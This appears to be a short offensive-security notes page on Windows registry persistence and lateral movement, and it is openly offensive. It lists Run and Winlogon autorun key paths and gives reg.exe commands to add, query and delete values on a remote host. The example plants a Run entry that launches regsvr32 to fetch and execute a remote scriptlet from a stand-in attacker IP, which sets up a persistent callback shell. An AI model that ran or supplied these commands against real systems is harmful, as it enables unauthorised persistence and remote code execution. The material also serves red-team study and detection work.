# Living off the Land

Search Tag(s): #lateral-movement #registry #windows

## These are the following registry path to create registry values to spawn a callback shell

TODO: Fill the missing info

```
HKLM\Software\Microsoft\Windows\CurrentVersion\Run

HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
```

## Manual

### Registry key syntax

```
C:\> reg.exe add \\<IP>\hklm\software\microsoft\windows\currentversion\run /v <registry_value> /t reg_sz /d <commands>

C:\> reg.exe query \\<IP>\hklm\software\microsoft\windows\currentversion\run

C:\> reg.exe delete \\<IP>\hklm\software\microsoft\windows\currentversion\run /v <registry_value> /f
```

### Here's the following example

```
C:\> reg.exe add \\<IP>\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v PersistenceShell /t REG_SZ /d "regsvr32 /s /n /u /i:http://<attacker_IP>/shell.sct scrobj.dll"

C:\> reg.exe query \\<IP>\HKLM\Software\Microsoft\Windows\CurrentVersion\Run

C:\> reg.exe delete \\<IP>\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v PersistenceShell /f
```

---
## References

### Backlinks

- [[Registry Hive References]]

### LOFLCAB

- [LOFLCAB: `reg.exe`](https://lofl-project.github.io/loflcab/Binaries/reg/)

### evilcomrade

- [evilcomrade: Windows Lateral Movement Fu](https://1evilcomrade.blogspot.com/2017/11/windows-lateral-movement-fu.html)